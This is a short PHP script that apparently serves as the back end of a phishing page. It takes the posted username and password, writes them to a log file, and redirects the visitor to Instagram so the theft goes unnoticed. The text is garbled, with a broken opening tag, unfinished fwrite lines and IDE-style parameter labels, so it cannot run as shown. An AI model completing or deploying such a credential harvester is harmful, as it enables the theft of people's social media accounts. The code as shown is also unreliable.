<? php

$username = $_POST['username' ];
$password = $_POST['password' ];

$fp = fopen( filename:'log.txt', mode:'a+');
fwrite($fp, string: 'Username:
fwrite($fp,
fwrite($fp,
fclose($fp);

header( string: 'Location: https://instagram.com');
